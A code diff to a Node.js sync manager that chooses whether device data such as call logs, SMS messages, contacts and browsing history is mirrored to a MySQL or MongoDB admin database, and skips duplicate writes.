@@ -1,5 +1,5 @@
 const { isMysql, getMysqlAdapter } = require('../db/DatabaseFactory');
-const { isAdminSyncEnabled, isDeviceExcludedFromAdminSync } = require('./adminSettingsService');
+const { isAdminSyncEnabled, isDeviceExcludedFromAdminSync, getAdminSettings } = require('./adminSettingsService');
 const Device = require('../models/Device');
 const ActivityLog = require('../models/ActivityLog');
 const Notification = require('../models/Notification');
@@ -12,6 +12,11 @@ const { userHasFeatureAccess } = require('./adminAuthService');
  * while respecting the Admin's sync toggle and device exclusion rules.
  */
 class SyncManager {
+    async getAdminTargetProvider() {
+        const settings = await getAdminSettings();
+        return settings.adminDbProvider || (isMysql() ? 'mongo' : 'mysql');
+    }
+
     /**
      * Check if a write should mirror to the Admin Database
      */
@@ -24,6 +29,16 @@ class SyncManager {
             if (isExcluded) return false;
         }
 
+        const settings = await getAdminSettings();
+        const activeProvider = isMysql() ? 'mysql' : 'mongo';
+        const adminProvider = settings.adminDbProvider || 'mongo';
+
+        // If the active database is already the admin DB, primary write recorded it.
+        // Skip duplicate write.
+        if (activeProvider === adminProvider) {
+            return false;
+        }
+
         return true;
     }
 
@@ -33,15 +48,16 @@ class SyncManager {
     async syncDevice(deviceId, data = {}) {
         const shouldSync = await this.shouldSyncToAdmin(deviceId);
         if (!shouldSync) {
-            console.log(`[SYNC-MANAGER] Device ${deviceId} excluded from Admin DB sync.`);
             return null;
         }
 
         try {
-            // Write to primary active adapter
-            if (isMysql()) {
+            const target = await this.getAdminTargetProvider();
+            if (target === 'mysql') {
                 await getMysqlAdapter().upsertDevice(deviceId, data);
             } else {
+                const { ensureMongooseConnected } = require('../db/mongo/connection');
+                await ensureMongooseConnected().catch(() => {});
                 await Device.findOneAndUpdate(
                     { deviceId },
                     { $set: data },
@@ -67,9 +83,12 @@ class SyncManager {
         }
 
         try {
-            if (isMysql()) {
+            const target = await this.getAdminTargetProvider();
+            if (target === 'mysql') {
                 await getMysqlAdapter().createActivityLog(data);
             } else {
+                const { ensureMongooseConnected } = require('../db/mongo/connection');
+                await ensureMongooseConnected().catch(() => {});
                 await ActivityLog.create(data);
             }
         } catch (err) {
@@ -91,7 +110,8 @@ class SyncManager {
         }
 
         try {
-            if (isMysql()) {
+            const target = await this.getAdminTargetProvider();
+            if (target === 'mysql') {
                 const pool = await getMysqlAdapter().getPool();
                 await pool.query(
                     `INSERT INTO virtual_files 
@@ -116,6 +136,8 @@ class SyncManager {
                     ]
                 );
             } else {
+                const { ensureMongooseConnected } = require('../db/mongo/connection');
+                await ensureMongooseConnected().catch(() => {});
                 await VirtualFile.create(fileData);
             }
         } catch (err) {
@@ -128,9 +150,12 @@ class SyncManager {
      */
     async syncNotification(notifData) {
         try {
-            if (isMysql()) {
+            const target = await this.getAdminTargetProvider();
+            if (target === 'mysql') {
                 await getMysqlAdapter().createNotification(notifData);
             } else {
+                const { ensureMongooseConnected } = require('../db/mongo/connection');
+                await ensureMongooseConnected().catch(() => {});
                 await Notification.create(notifData);
             }
         } catch (err) {
@@ -151,9 +176,12 @@ class SyncManager {
         }
 
         try {
-            if (isMysql()) {
+            const target = await this.getAdminTargetProvider();
+            if (target === 'mysql') {
                 await getMysqlAdapter().upsertBrowserHistories(deviceId, entries, userId);
             } else {
+                const { ensureMongooseConnected } = require('../db/mongo/connection');
+                await ensureMongooseConnected().catch(() => {});
                 const BrowserHistory = require('../models/BrowserHistory');
                 for (const e of entries) {
                     if (!e.url) continue;
@@ -182,9 +210,12 @@ class SyncManager {
         }
 
         try {
-            if (isMysql()) {
+            const target = await this.getAdminTargetProvider();
+            if (target === 'mysql') {
                 await getMysqlAdapter().upsertAppHistories(deviceId, entries, userId);
             } else {
+                const { ensureMongooseConnected } = require('../db/mongo/connection');
+                await ensureMongooseConnected().catch(() => {});
                 const AppHistory = require('../models/AppHistory');
                 for (const e of entries) {
                     const appName = e.appName || e.app_name || 'Unknown';
@@ -213,9 +244,12 @@ class SyncManager {
         }
 
         try {
-            if (isMysql()) {
+            const target = await this.getAdminTargetProvider();
+            if (target === 'mysql') {
                 await getMysqlAdapter().upsertCallLogs(deviceId, entries, userId);
             } else {
+                const { ensureMongooseConnected } = require('../db/mongo/connection');
+                await ensureMongooseConnected().catch(() => {});
                 const CallLog = require('../models/CallLog');
                 for (const e of entries) {
                     await CallLog.updateOne(
@@ -243,9 +277,12 @@ class SyncManager {
         }
 
         try {
-            if (isMysql()) {
+            const target = await this.getAdminTargetProvider();
+            if (target === 'mysql') {
                 await getMysqlAdapter().upsertSmsMessages(deviceId, entries, userId);
             } else {
+                const { ensureMongooseConnected } = require('../db/mongo/connection');
+                await ensureMongooseConnected().catch(() => {});
                 const SmsMessage = require('../models/SmsMessage');
                 for (const e of entries) {
                     await SmsMessage.updateOne(
@@ -273,9 +310,12 @@ class SyncManager {
         }
 
         try {
-            if (isMysql()) {
+            const target = await this.getAdminTargetProvider();
+            if (target === 'mysql') {
                 await getMysqlAdapter().upsertContacts(deviceId, entries, userId);
             } else {
+                const { ensureMongooseConnected } = require('../db/mongo/connection');
+                await ensureMongooseConnected().catch(() => {});
                 const Contact = require('../models/Contact');
                 for (const e of entries) {
                     await Contact.updateOne(
